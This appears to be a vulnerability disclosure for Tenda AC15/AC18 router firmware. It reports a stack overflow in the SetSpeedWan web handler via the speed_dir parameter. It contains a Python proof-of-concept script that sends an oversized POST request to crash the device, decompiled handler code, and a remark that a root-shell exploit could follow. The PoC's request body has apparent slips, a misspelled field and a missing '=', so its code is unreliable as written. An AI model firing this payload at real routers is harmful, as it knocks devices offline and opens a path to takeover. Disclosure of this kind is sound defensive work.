### Affected product

```
AC15 V15.03.05.19  AC18 V15.03.05.19
```

/goform/SetSpeedWan，speed_dir is controllable and will eventually be spliced into s by sprintf. It is worth noting that the size is not checked, resulting in a stack overflow vulnerability

### POC

```
import socket
import os

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

ip = '192.168.0.119'
port = 80

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

r.connect((ip, port))

rn = b'\r\n'

p1 = b'a' * 0x100
p2 = b'ucloud_enabld=1&speed_dir' + p1

p3 = b"POST /goform/SetSpeedWan" + b" HTTP/1.1" + rn
p3 += b"Host: 192.168.0.119" + rn
p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn
p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
p3 += b"Accept-Language: en-US,en;q=0.5" + rn
p3 += b"Accept-Encoding: gzip, deflate" + rn
p3 += b"Cookie: curShow=; ac_login_info=passwork; test=A; password=1111" + rn
p3 += b"Connection: close" + rn
p3 += b"Upgrade-Insecure-Requests: 1" + rn
p3 += (b"Content-Length: %d" % len(p2)) +rn
p3 += b'Content-Type: application/x-www-form-urlencoded'+rn
p3 += rn
p3 += p2

r.send(p3)

response = r.recv(4096)
response = response.decode()
li(response)
```

### Detail

```c
  v7 = (char *)sub_2BA8C(a1, "speed_dir", "0");
  v6 = (char *)sub_2BA8C(a1, "ucloud_enable", "0");
  v5 = sub_2BA8C(a1, "password", "0");
  GetValue("speedtest.flag", nptr);
  if ( atoi((const char *)nptr) )
  {
    v8 = 1;
  }
  else
  {
    SetValue("speedtest.flag", "1");
    if ( atoi(v7) )
    {
      if ( !atoi(v6) )
      {
        SetValue("ucloud.en", "1");
        SetValue("ucloud.syncserver", "1");
        SetValue("ucloud.password", v5);
        SetValue("qos.ucloud.flag", "1");
        doSystemCmd("cfm Post ucloud 0");
      }
      SetValue("speedtest.ret", "2");
      doSystemCmd("/bin/speedtest %d %d &", 1, 1);
    }
    else
    {
      SetValue("speedtest.ret", "4");
      doSystemCmd("cfm Post ucloud 5");
    }
  }
  sprintf((char *)s, "{\"errCode\":%d,\"speed_dir\":%s}", v8, v7);
  return sub_9CCBC(a1, s);
```

You can see the router crash, and finally we can write an exp to get a root shell
